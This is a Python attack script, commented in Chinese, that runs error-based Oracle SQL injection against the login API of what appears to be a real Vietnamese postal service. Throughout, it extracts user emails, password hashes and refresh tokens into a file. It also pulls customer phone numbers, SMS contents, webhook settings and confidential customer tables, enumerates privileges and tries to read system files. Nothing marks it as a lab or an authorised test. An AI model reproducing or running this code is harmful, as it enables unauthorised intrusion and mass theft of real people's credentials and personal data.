#!/usr/bin/env python3
"""
深度提取所有敏感信息
"""

import requests
import json
import time

class DeepExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_all_users_full(self):
        """提取所有68个用户完整信息"""
        print("=" * 80)
        print("👥 提取所有68个用户完整信息")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        users = []
        
        for i in range(1, 69):
            query = f"SELECT USERID||'|'||USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL||'|'||ISACTIVE||'|'||REFRESHTOKEN FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 4:
                    user = {
                        'id': parts[0],
                        'username': parts[1],
                        'email': parts[2],
                        'hash': parts[3],
                        'role': parts[4] if len(parts) > 4 else '',
                        'active': parts[5] if len(parts) > 5 else '',
                        'token': parts[6] if len(parts) > 6 else ''
                    }
                    users.append(user)
                    
                    if i <= 20:  # 只显示前20个
                        print(f"\n{i}. {user['username']}")
                        print(f"   Email: {user['email']}")
                        print(f"   Role: {user['role']}")
                        print(f"   Hash: {user['hash'][:60]}...")
                        if user['token'] and len(user['token']) > 10:
                            print(f"   Token: {user['token'][:60]}...")
            
            if i % 10 == 0:
                print(f"\n已提取 {i}/68...")
            
            time.sleep(0.5)
        
        print(f"\n\n✅ 总共提取 {len(users)} 个用户")
        
        # 保存到文件
        with open('/workspace/all_users.txt', 'w', encoding='utf-8') as f:
            for u in users:
                f.write(f"{u['username']}:{u['email']}:{u['hash']}\n")
        
        print(f"✅ 已保存到 /workspace/all_users.txt")
        
        return users
    
    def extract_webhook_tables(self):
        """提取Webhook表数据"""
        print("\n" + "=" * 80)
        print("🔗 提取Webhook配置")
        print("=" * 80)
        
        tables = ['PARTNER_MCS_WEBHOOK', 'PARTNER_MCS_DELIVERY_WEBHOOK']
        
        for table in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 获取记录数
            query_count = f"SELECT COUNT(*) FROM EMS.{table}"
            count = self.extract_via_error(query_count)
            
            if count and count != '0':
                print(f"记录数: {count}")
                
                # 获取字段
                print(f"\n字段:")
                for i in range(1, 11):
                    query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
                    col = self.extract_via_error(query_col)
                    
                    if col and col != 'NULL':
                        print(f"  {col}")
                    
                    time.sleep(0.3)
                
                # 提取数据
                print(f"\n数据样本:")
                
                try:
                    max_rows = min(int(count), 20)
                    
                    for i in range(1, max_rows + 1):
                        query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
                        result = self.extract_via_error(query)
                        
                        if result:
                            print(f"\n{i}. {result}")
                        
                        time.sleep(0.5)
                except:
                    pass
            else:
                print(f"表为空或不存在")
            
            time.sleep(1)
    
    def extract_e1_sms_table(self):
        """提取E1_SMS表（短信表可能有真实电话）"""
        print("\n" + "=" * 80)
        print("📱 提取E1_SMS表（短信发送记录）")
        print("=" * 80)
        
        table = 'E1_SMS'
        
        # 获取字段
        print(f"\n字段:")
        for i in range(1, 16):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.3)
        
        # 10月10日数据
        date = '20251010'
        
        query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE NGAY='{date}'"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"\n10月10日记录数: {count}")
        
        time.sleep(1)
        
        # 查找真实电话
        print(f"\n查找真实电话号码:")
        
        query_real = f"SELECT COUNT(*) FROM EMS.{table} WHERE NGAY='{date}' AND SODIENTHOAI NOT LIKE '%+%' AND SODIENTHOAI NOT LIKE '%x%' AND LENGTH(SODIENTHOAI)>=10"
        real_count = self.extract_via_error(query_real)
        
        if real_count:
            print(f"  真实电话数: {real_count}")
            
            if real_count != '0':
                print(f"\n  🎉 找到真实电话！提取样本...")
                
                time.sleep(1)
                
                for i in range(1, 21):
                    query_sample = f"SELECT MABC||'|'||SODIENTHOAI||'|'||NOIDUNG FROM (SELECT * FROM EMS.{table} WHERE NGAY='{date}' AND SODIENTHOAI NOT LIKE '%+%' AND LENGTH(SODIENTHOAI)>=10) WHERE ROWNUM={i}"
                    sample = self.extract_via_error(query_sample)
                    
                    if sample:
                        parts = sample.split('|')
                        print(f"\n  {i}. MABC: {parts[0] if len(parts) > 0 else ''}")
                        print(f"     电话: {parts[1] if len(parts) > 1 else ''}")
                        print(f"     内容: {parts[2] if len(parts) > 2 else ''}")
                    
                    time.sleep(0.5)
        
        time.sleep(1)
        
        # 提取所有样本
        print(f"\n所有短信样本（前20条）:")
        
        for i in range(1, 21):
            query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T WHERE NGAY='{date}') WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                print(f"\n{i}. {result}")
            
            time.sleep(0.5)
    
    def extract_khach_hang_bao_mat(self):
        """提取KHACH_HANG_BAO_MAT表（客户保密）"""
        print("\n" + "=" * 80)
        print("🔒 提取KHACH_HANG_BAO_MAT表（客户保密信息）")
        print("=" * 80)
        
        table = 'KHACH_HANG_BAO_MAT'
        
        # 检查表是否存在
        query_exist = f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME='{table}'"
        exists = self.extract_via_error(query_exist)
        
        if not exists or exists == '0':
            print(f"表不存在")
            return
        
        # 获取记录数
        query_count = f"SELECT COUNT(*) FROM EMS.{table}"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"记录数: {count}")
        
        time.sleep(1)
        
        # 获取字段
        print(f"\n字段:")
        for i in range(1, 21):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.3)
        
        # 提取数据
        print(f"\n提取所有数据:")
        
        try:
            max_rows = min(int(count), 50)
            
            for i in range(1, max_rows + 1):
                query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
                result = self.extract_via_error(query)
                
                if result:
                    print(f"\n{i}. {result}")
                
                time.sleep(0.5)
        except:
            pass
    
    def batch_extract_journey_tokens(self):
        """批量提取JOURNEYTOKEN真实电话"""
        print("\n" + "=" * 80)
        print("🎫 批量提取JOURNEYTOKEN真实电话")
        print("=" * 80)
        
        table = 'JOURNEYTOKEN_ZNS'
        date = '20251010'
        
        # 查找真实电话
        query_real = f"SELECT COUNT(*) FROM EMS.{table} WHERE TOKENDATE='{date}' AND PHONE NOT LIKE '%x%' AND PHONE NOT LIKE '%+%' AND LENGTH(PHONE)>=10"
        real_count = self.extract_via_error(query_real)
        
        if real_count:
            print(f"真实电话数: {real_count}")
            
            if real_count != '0':
                print(f"\n🎉 找到真实电话！批量提取...")
                
                time.sleep(1)
                
                for i in range(1, 51):  # 提取前50个
                    query = f"SELECT ITEMCODE||'|'||PHONE||'|'||TOKEN FROM (SELECT * FROM EMS.{table} WHERE TOKENDATE='{date}' AND PHONE NOT LIKE '%x%' AND LENGTH(PHONE)>=10) WHERE ROWNUM={i}"
                    result = self.extract_via_error(query)
                    
                    if result:
                        parts = result.split('|')
                        print(f"\n{i}. 运单: {parts[0] if len(parts) > 0 else ''}")
                        print(f"   电话: {parts[1] if len(parts) > 1 else ''}")
                        print(f"   Token: {parts[2] if len(parts) > 2 else ''}")
                    
                    time.sleep(0.3)
    
    def try_file_read(self):
        """尝试文件读取"""
        print("\n" + "=" * 80)
        print("📁 尝试文件读取")
        print("=" * 80)
        
        # Oracle文件读取
        files_to_try = [
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\inetpub\\wwwroot\\web.config',
            '/var/www/html/config.php',
        ]
        
        for file_path in files_to_try:
            print(f"\n尝试读取: {file_path}")
            
            # UTL_FILE方法
            query = f"SELECT UTL_FILE.FOPEN('{file_path}','r') FROM DUAL"
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result:
                print(f"  可能成功: {result}")
            
            time.sleep(1)
    
    def enumerate_all_tables_with_data(self):
        """枚举所有有数据的表"""
        print("\n" + "=" * 80)
        print("📊 枚举所有有数据的表（前100个）")
        print("=" * 80)
        
        for i in range(1, 101):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' ORDER BY TABLE_NAME) WHERE RN={i}"
            table = self.extract_via_error(query)
            
            if table and table != 'NULL':
                # 获取记录数
                time.sleep(0.3)
                query_count = f"SELECT COUNT(*) FROM EMS.{table}"
                count = self.extract_via_error(query_count)
                
                if count and count != '0':
                    print(f"{i}. {table:40} - {count:>10} 条")
            
            if i % 20 == 0:
                print(f"\n已检查 {i}/100...")
            
            time.sleep(0.3)
    
    def check_privileges(self):
        """检查当前权限"""
        print("\n" + "=" * 80)
        print("🔐 检查当前用户权限")
        print("=" * 80)
        
        queries = [
            ("表权限", "SELECT PRIVILEGE FROM USER_TAB_PRIVS WHERE ROWNUM<=10"),
            ("系统权限", "SELECT PRIVILEGE FROM USER_SYS_PRIVS WHERE ROWNUM<=10"),
            ("角色权限", "SELECT GRANTED_ROLE FROM USER_ROLE_PRIVS WHERE ROWNUM<=10"),
            ("DBA权限", "SELECT * FROM SESSION_PRIVS WHERE PRIVILEGE LIKE '%DBA%'"),
        ]
        
        for name, query in queries:
            print(f"\n{name}:")
            result = self.extract_via_error(query)
            
            if result:
                print(f"  {result}")
            
            time.sleep(1)
    
    def run_deep_extraction(self):
        """执行深度提取"""
        print("=" * 80)
        print("🎯 深度提取所有敏感信息")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.check_privileges()
        self.extract_all_users_full()
        self.extract_webhook_tables()
        self.extract_e1_sms_table()
        self.extract_khach_hang_bao_mat()
        self.batch_extract_journey_tokens()
        self.enumerate_all_tables_with_data()
        
        print("\n" + "=" * 80)
        print("🎉 深度提取完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = DeepExtractor(target_url)
    extractor.run_deep_extraction()
